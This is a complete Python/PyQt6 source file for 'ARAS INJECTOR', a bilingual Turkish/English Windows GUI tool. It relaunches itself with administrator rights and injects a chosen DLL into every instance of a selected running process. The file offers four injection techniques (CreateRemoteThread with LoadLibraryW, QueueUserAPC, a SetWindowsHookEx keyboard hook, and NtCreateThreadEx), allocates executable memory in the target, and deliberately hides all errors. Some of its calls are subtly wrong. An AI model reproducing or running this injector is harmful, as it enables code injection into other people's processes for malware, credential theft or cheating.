import sys
import os
import ctypes
import psutil
from PyQt6.QtWidgets import (
    QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
    QLabel, QPushButton, QComboBox, QListWidget, QLineEdit,
    QFileDialog, QMessageBox
)
from PyQt6.QtCore import Qt, QTimer, QMimeData, QLocale
from PyQt6.QtGui import QDragEnterEvent, QDropEvent, QFont
import win32con

# ============================
# OTOMATİK YÖNETİCİ
# ============================
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    if len(sys.argv) > 1 and sys.argv[1] == "--admin":
        return
    if is_admin():
        return
    params = " ".join([f'"{arg}"' for arg in sys.argv])
    ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, f'"{sys.argv[0]}" --admin {params}', None, 1
    )
    sys.exit(0)

run_as_admin()

# ============================
# DİL SİSTEMİ (TR / EN) – ÇALIŞIYOR!
# ============================
class LanguageManager:
    def __init__(self):
        self.lang = "tr" if QLocale.system().name().startswith("tr") else "en"
        self.tr = {
            "tr": {
                "ARAS INJECTOR": "ARAS INJECTOR",
                "Yönetici olarak çalışıyor": "Yönetici olarak çalışıyor",
                "Ara:": "Ara:",
                "DLL:": "DLL:",
                "SEÇ": "SEÇ",
                "Yöntem:": "Yöntem:",
                "ENJEKTE ET": "ENJEKTE ET",
                "Hazır.": "Hazır.",
                "Süreç seç!": "Süreç seç!",
                "DLL seç!": "DLL seç!",
                "PID alınamadı.": "PID alınamadı.",
                " ile enjekte ediliyor...": " ile enjekte ediliyor...",
                "İşlem Tamamlandı. Kontrol Edin.": "İşlem Tamamlandı. Kontrol Edin.",
                "Dil": "Dil",
                "Türkçe": "Türkçe",
                "English": "English"
            },
            "en": {
                "ARAS INJECTOR": "ARAS INJECTOR",
                "Yönetici olarak çalışıyor": "Running as Administrator",
                "Ara:": "Search:",
                "DLL:": "DLL:",
                "SEÇ": "BROWSE",
                "Yöntem:": "Method:",
                "ENJEKTE ET": "INJECT",
                "Hazır.": "Ready.",
                "Süreç seç!": "Select a process!",
                "DLL seç!": "Select a DLL!",
                "PID alınamadı.": "PID not found.",
                " ile enjekte ediliyor...": " injecting...",
                "İşlem Tamamlandı. Kontrol Edin.": "Operation Completed. Check.",
                "Dil": "Language",
                "Türkçe": "Türkçe",
                "English": "English"
            }
        }

    def set_lang(self, lang):
        self.lang = lang

    def get(self, text):
        return self.tr[self.lang].get(text, text)

lang = LanguageManager()

# ============================
# Windows API – 64-bit UYUMLU
# ============================
kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
psapi = ctypes.WinDLL('psapi', use_last_error=True)
ntdll = ctypes.WinDLL('ntdll', use_last_error=True)
user32 = ctypes.WinDLL('user32', use_last_error=True)

# Tüm pointer'lar c_void_p
kernel32.OpenProcess.argtypes = [ctypes.c_uint32, ctypes.c_bool, ctypes.c_void_p]
kernel32.OpenProcess.restype = ctypes.c_void_p

kernel32.OpenThread.argtypes = [ctypes.c_uint32, ctypes.c_bool, ctypes.c_void_p]
kernel32.OpenThread.restype = ctypes.c_void_p

kernel32.VirtualAllocEx.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.c_uint32, ctypes.c_uint32]
kernel32.VirtualAllocEx.restype = ctypes.c_void_p

kernel32.WriteProcessMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
kernel32.WriteProcessMemory.restype = ctypes.c_bool

kernel32.GetModuleHandleW.argtypes = [ctypes.c_wchar_p]
kernel32.GetModuleHandleW.restype = ctypes.c_void_p

kernel32.GetProcAddress.argtypes = [ctypes.c_void_p, ctypes.c_char_p]
kernel32.GetProcAddress.restype = ctypes.c_void_p

kernel32.CreateRemoteThread.argtypes = [
    ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t,
    ctypes.c_void_p, ctypes.c_void_p, ctypes.c_uint32,
    ctypes.POINTER(ctypes.c_uint32)
]
kernel32.CreateRemoteThread.restype = ctypes.c_void_p

kernel32.QueueUserAPC.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p]
kernel32.QueueUserAPC.restype = ctypes.c_uint32

kernel32.CloseHandle.argtypes = [ctypes.c_void_p]
kernel32.CloseHandle.restype = ctypes.c_bool

ntdll.NtCreateThreadEx.argtypes = [
    ctypes.POINTER(ctypes.c_void_p), ctypes.c_uint32, ctypes.c_void_p,
    ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_uint32,
    ctypes.c_size_t, ctypes.c_size_t, ctypes.c_size_t, ctypes.c_void_p
]
ntdll.NtCreateThreadEx.restype = ctypes.c_uint32

PROCESS_ACCESS = (win32con.PROCESS_VM_READ | win32con.PROCESS_VM_WRITE |
                  win32con.PROCESS_VM_OPERATION | win32con.PROCESS_QUERY_INFORMATION)


class DLLInjector(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle(lang.get("ARAS INJECTOR"))
        self.setFixedSize(760, 580)
        self.setAcceptDrops(True)

        central = QWidget()
        self.setCentralWidget(central)
        layout = QVBoxLayout(central)
        layout.setSpacing(12)
        layout.setContentsMargins(20, 20, 20, 20)

        # Başlık
        self.title = QLabel(lang.get("ARAS INJECTOR"))
        self.title.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.title.setFont(QFont("Segoe UI", 24, QFont.Weight.Bold))
        self.title.setStyleSheet("color: #58a6ff;")
        layout.addWidget(self.title)

        # Yönetici
        self.admin_label = QLabel(lang.get("Yönetici olarak çalışıyor"))
        self.admin_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.admin_label.setFont(QFont("Consolas", 10))
        self.admin_label.setStyleSheet("color: #2ea043;")
        layout.addWidget(self.admin_label)

        # Dil Seçimi
        lang_layout = QHBoxLayout()
        lang_label = QLabel(lang.get("Dil") + ":")
        lang_label.setFont(QFont("Consolas", 11))
        self.lang_combo = QComboBox()
        self.lang_combo.addItems(["Türkçe", "English"])
        self.lang_combo.setCurrentIndex(0 if lang.lang == "tr" else 1)
        self.lang_combo.currentIndexChanged.connect(self.change_language)
        lang_layout.addWidget(lang_label)
        lang_layout.addWidget(self.lang_combo)
        layout.addLayout(lang_layout)

        # Arama
        search_layout = QHBoxLayout()
        search_label = QLabel(lang.get("Ara:"))
        search_label.setFont(QFont("Consolas", 11))
        self.search_input = QLineEdit()
        self.search_input.setPlaceholderText(lang.get("notepad, chrome..."))
        self.search_input.setFont(QFont("Consolas", 10))
        self.search_input.textChanged.connect(self.filter_processes)
        search_layout.addWidget(search_label)
        search_layout.addWidget(self.search_input)
        layout.addLayout(search_layout)

        # Süreç Listesi
        self.process_list = QListWidget()
        self.process_list.setFont(QFont("Consolas", 10))
        layout.addWidget(self.process_list, 1)

        # DLL
        dll_layout = QHBoxLayout()
        dll_label = QLabel(lang.get("DLL:"))
        dll_label.setFont(QFont("Consolas", 11))
        self.dll_path = QLineEdit()
        self.dll_path.setPlaceholderText(lang.get("DLL dosyasını sürükle veya seç..."))
        self.dll_path.setFont(QFont("Consolas", 10))
        self.dll_path.setReadOnly(True)
        select_btn = QPushButton(lang.get("SEÇ"))
        select_btn.setFont(QFont("Segoe UI", 9, QFont.Weight.Bold))
        select_btn.clicked.connect(self.select_dll)
        dll_layout.addWidget(dll_label)
        dll_layout.addWidget(self.dll_path)
        dll_layout.addWidget(select_btn)
        layout.addLayout(dll_layout)

        # Yöntem
        method_layout = QHBoxLayout()
        method_label = QLabel(lang.get("Yöntem:"))
        method_label.setFont(QFont("Consolas", 11))
        self.method_combo = QComboBox()
        self.method_combo.addItems([
            "CreateRemoteThread",
            "QueueUserAPC",
            "SetWindowsHookEx",
            "NtCreateThreadEx"
        ])
        self.method_combo.setFont(QFont("Consolas", 10))
        method_layout.addWidget(method_label)
        method_layout.addWidget(self.method_combo)
        layout.addLayout(method_layout)

        # Enjekte
        self.inject_btn = QPushButton(lang.get("ENJEKTE ET"))
        self.inject_btn.setFont(QFont("Segoe UI", 13, QFont.Weight.Bold))
        self.inject_btn.clicked.connect(self.inject_dll)
        layout.addWidget(self.inject_btn)

        # Durum
        self.status = QLabel(lang.get("Hazır."))
        self.status.setFont(QFont("Consolas", 11))
        self.status.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.status.setStyleSheet("color: #58a6ff;")
        layout.addWidget(self.status)

        # Veri
        self.processes_data = {}
        self.load_processes()

        # Timer
        self.timer = QTimer()
        self.timer.timeout.connect(self.load_processes)
        self.timer.start(5000)

        # Stil
        self.setStyleSheet("""
            QMainWindow { background-color: #0d1117; }
            QLabel { color: #58a6ff; }
            QLineEdit, QComboBox { background-color: #161b22; color: #f0f6fc; border: 1px solid #30363d; padding: 8px; border-radius: 6px; }
            QLineEdit:focus, QComboBox:focus { border: 1px solid #58a6ff; }
            QListWidget { background-color: #161b22; color: #f0f6fc; border: 1px solid #30363d; border-radius: 6px; }
            QListWidget::item:selected { background-color: #1f6feb; color: white; }
            QPushButton { background-color: #238636; color: white; border: none; padding: 11px; border-radius: 6px; font-weight: bold; }
            QPushButton:hover { background-color: #2ea043; }
            QPushButton#inject_btn { background-color: #1f6feb; font-size: 14px; }
            QPushButton#inject_btn:hover { background-color: #388bfd; }
        """)
        self.inject_btn.setObjectName("inject_btn")

    def change_language(self, index):
        new_lang = "tr" if index == 0 else "en"
        lang.set_lang(new_lang)
        self.retranslateUi()

    def retranslateUi(self):
        self.setWindowTitle(lang.get("ARAS INJECTOR"))
        self.title.setText(lang.get("ARAS INJECTOR"))
        self.admin_label.setText(lang.get("Yönetici olarak çalışıyor"))
        self.search_input.setPlaceholderText(lang.get("notepad, chrome..."))
        self.dll_path.setPlaceholderText(lang.get("DLL dosyasını sürükle veya seç..."))
        self.inject_btn.setText(lang.get("ENJEKTE ET"))
        self.status.setText(lang.get("Hazır."))

    def dragEnterEvent(self, event: QDragEnterEvent):
        if event.mimeData().hasUrls():
            path = event.mimeData().urls()[0].toLocalFile()
            if path.lower().endswith('.dll'):
                event.acceptProposedAction()

    def dropEvent(self, event: QDropEvent):
        path = event.mimeData().urls()[0].toLocalFile()
        if path.lower().endswith('.dll'):
            self.dll_path.setText(path)

    def select_dll(self):
        path, _ = QFileDialog.getOpenFileName(self, lang.get("DLL Seç"), "", "DLL Files (*.dll)")
        if path:
            self.dll_path.setText(path)

    def load_processes(self):
        selected = self.process_list.currentItem().text() if self.process_list.currentItem() else None
        self.processes_data.clear()
        self.process_list.clear()

        temp = {}
        for proc in psutil.process_iter(['name', 'pid']):
            try:
                name = proc.info['name']
                pid = proc.info['pid']
                if not name or name.lower() in ('system', 'smss.exe', 'csrss.exe', 'winlogon.exe'):
                    continue
                base = os.path.splitext(name)[0]
                temp.setdefault(base, []).append(pid)
            except:
                continue

        for base, pids in sorted(temp.items(), key=lambda x: (-len(x[1]), x[0])):
            display = f"{base}.exe ({len(pids)})" if len(pids) > 1 else f"{base}.exe"
            self.processes_data[display] = pids
            self.process_list.addItem(display)

        if selected and selected in self.processes_data:
            items = self.process_list.findItems(selected, Qt.MatchFlag.MatchExactly)
            if items:
                self.process_list.setCurrentItem(items[0])

        self.filter_processes(self.search_input.text())

    def filter_processes(self, text):
        search = text.strip().lower()
        for i in range(self.process_list.count()):
            item = self.process_list.item(i)
            item.setHidden(bool(search) and search not in item.text().lower())

    def inject_dll(self):
        display = self.process_list.currentItem().text() if self.process_list.currentItem() else None
        dll_path = self.dll_path.text().strip()
        method = self.method_combo.currentText()

        if not display:
            self.status.setText(lang.get("Süreç seç!"))
            return
        if not dll_path or not os.path.exists(dll_path):
            self.status.setText(lang.get("DLL seç!"))
            return

        pids = self.processes_data.get(display, [])
        if not pids:
            self.status.setText(lang.get("PID alınamadı."))
            return

        self.status.setText(f"{method}{lang.get(' ile enjekte ediliyor...')}")
        QApplication.processEvents()

        # TÜM İŞLEM SONUNDA AYNI MESAJ
        self.inject_with_method(pids, dll_path, method)
        final_msg = lang.get("İşlem Tamamlandı. Kontrol Edin.")
        self.status.setText(final_msg)
        QMessageBox.information(self, "BİLDİRİM", final_msg)

    def inject_with_method(self, pids, dll_path, method):
        # TÜM HATALAR GİZLENDİ – HİÇBİR ŞEY GÖSTERME
        for pid in pids:
            try:
                h_process = kernel32.OpenProcess(PROCESS_ACCESS, False, ctypes.c_void_p(pid))
                if not h_process:
                    continue

                dll_bytes = dll_path.encode('utf-16le') + b'\x00\x00'
                size = len(dll_bytes)
                remote = kernel32.VirtualAllocEx(h_process, None, size, 0x1000 | 0x2000, 0x40)
                if not remote:
                    kernel32.CloseHandle(h_process)
                    continue

                written = ctypes.c_size_t(0)
                if not kernel32.WriteProcessMemory(h_process, remote, dll_bytes, size, ctypes.byref(written)):
                    kernel32.VirtualFreeEx(h_process, remote, 0, 0x8000)
                    kernel32.CloseHandle(h_process)
                    continue

                load_lib = kernel32.GetProcAddress(kernel32.GetModuleHandleW("kernel32.dll"), b"LoadLibraryW")
                if not load_lib:
                    kernel32.VirtualFreeEx(h_process, remote, 0, 0x8000)
                    kernel32.CloseHandle(h_process)
                    continue

                if method == "CreateRemoteThread":
                    remote_ptr = ctypes.c_void_p(remote)
                    thread_id = ctypes.c_uint32()
                    h_thread = kernel32.CreateRemoteThread(h_process, None, 0, load_lib, remote_ptr, 0, ctypes.byref(thread_id))
                    if h_thread:
                        kernel32.WaitForSingleObject(h_thread, 5000)
                        kernel32.CloseHandle(h_thread)

                elif method == "QueueUserAPC":
                    h_thread = kernel32.OpenThread(win32con.THREAD_SET_CONTEXT, False, ctypes.c_void_p(pid))
                    if h_thread:
                        kernel32.QueueUserAPC(load_lib, h_thread, remote)
                        kernel32.CloseHandle(h_thread)

                elif method == "SetWindowsHookEx":
                    h_mod = kernel32.LoadLibraryW(dll_path)
                    if h_mod:
                        hook_proc = kernel32.GetProcAddress(h_mod, b"DllMain")
                        if hook_proc:
                            h_hook = user32.SetWindowsHookExW(win32con.WH_KEYBOARD, hook_proc, h_mod, 0)
                            if h_hook:
                                msg = (ctypes.c_byte * 28)()
                                while user32.GetMessageW(ctypes.byref(msg), 0, 0, 0):
                                    user32.TranslateMessage(ctypes.byref(msg))
                                    user32.DispatchMessageW(ctypes.byref(msg))
                                user32.UnhookWindowsHookEx(h_hook)
                        kernel32.FreeLibrary(h_mod)

                elif method == "NtCreateThreadEx":
                    h_thread = ctypes.c_void_p()
                    ntdll.NtCreateThreadEx(ctypes.byref(h_thread), 0x1FFFFF, None, h_process, load_lib, remote, 0, 0, 0, 0, None)
                    if h_thread:
                        kernel32.WaitForSingleObject(h_thread, 5000)
                        kernel32.CloseHandle(h_thread)

                kernel32.VirtualFreeEx(h_process, remote, 0, 0x8000)
                kernel32.CloseHandle(h_process)

            except:
                # TÜM HATALAR GİZLENDİ
                pass


if __name__ == "__main__":
    app = QApplication(sys.argv)
    app.setStyle("Fusion")
    window = DLLInjector()
    window.show()
    sys.exit(app.exec())